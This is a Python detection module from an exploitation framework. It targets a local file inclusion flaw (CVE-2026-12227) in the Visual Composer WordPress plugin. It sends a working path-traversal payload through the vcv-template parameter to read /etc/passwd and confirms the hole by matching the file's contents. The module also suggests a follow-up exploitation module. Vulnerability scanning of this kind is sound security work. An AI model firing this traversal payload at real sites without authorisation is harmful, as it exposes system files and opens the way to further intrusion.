#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Visual Composer <= 45.16.0 vcv-template LFI (CVE-2026-12227)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "visualcomposer"
_VULN_HIGH = (45, 16, 0)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Visual Composer CVE-2026-12227 LFI detect",
        "description": (
            "Detects CVE-2026-12227 via vcv-template path traversal to /etc/passwd."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-12227",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-12227",
            "https://github.com/murrez/CVE-2026-12227",
        ],
        "modules": ["auxiliary/admin/http/visual_composer_cve_2026_12227_lfi"],
        "tags": ["web", "scanner", "wordpress", "visualcomposer", "lfi", "cve-2026-12227"],
        "agent": {
            "chain": {"suggested_followups": ["auxiliary/admin/http/visual_composer_cve_2026_12227_lfi"]},
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self.wp_normalize_base_path(self.base_path or "/")) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        if not home or "visualcomposer" not in (home.text or "").lower():
            return False
        r = self.http_request(
            method="GET",
            path=self._join("/"),
            params={
                "vcv-template-type": "vc",
                "vcv-template": "../../../../../../../etc/passwd",
            },
            allow_redirects=False,
        )
        if r and r.status_code == 200 and re.search(r"root:.*:0:0:", r.text or ""):
            self.set_info(
                severity="critical",
                reason="Visual Composer CVE-2026-12227 LFI confirmed",
                path="/?vcv-template=",
                cve="CVE-2026-12227",
            )
            return True
        return False
